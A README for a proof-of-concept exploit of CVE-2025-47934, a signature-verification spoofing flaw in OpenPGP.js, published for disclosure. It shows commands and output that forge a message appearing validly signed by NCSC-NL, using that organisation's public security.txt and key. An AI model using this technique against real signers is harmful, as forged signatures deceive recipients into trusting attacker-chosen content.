# CVE-2025-47934

Spoofing of OpenPGP.js's signature verification.

For more information, see:

- Blog post with details: https://codeanlabs.com/blog/research/cve-2025-47934-spoofing-openpgp-js-signature-verification/
- Advisory: https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8

## Usage

Test using your own signed message:

```
$ echo "hello world" | gpg -s -z0 > legit_signed_message.pgp
$ python generate_spoofed_message.py legit_signed_message.pgp > spoofed_message.asc
$ node validate_signature.js spoofed_message.asc <(gpg --export -a thomas@codean.io)
Signed message data: malicious
Verified signature by key id d45bb6865e5472ca: Thomas Rinsma <thomas@codean.io>
```

Or take someone else's signed message and spoof the contents:
```
# Extract victim's PGP key and a clear-signed message (security.txt in this case)
$ wget https://www.ncsc.nl/binaries/ncsc/documenten/publicaties/2025/januari/06/pgp-key/pgp.txt
$ wget https://www.ncsc.nl/.well-known/security.txt
# Generate the spoofed message
$ python extract_from_clearsign_and_spoof.py security.txt > spoofed_message.asc

$ node validate_signature.js spoofed_message.asc pgp.txt
Signed message data: Hello from Codean Labs.
Verified signature by key id cad4ceab247e705f: NCSC-NL 2025 <cert@ncsc.nl>,NCSC-NL 2025 general information <info@ncsc.nl>
```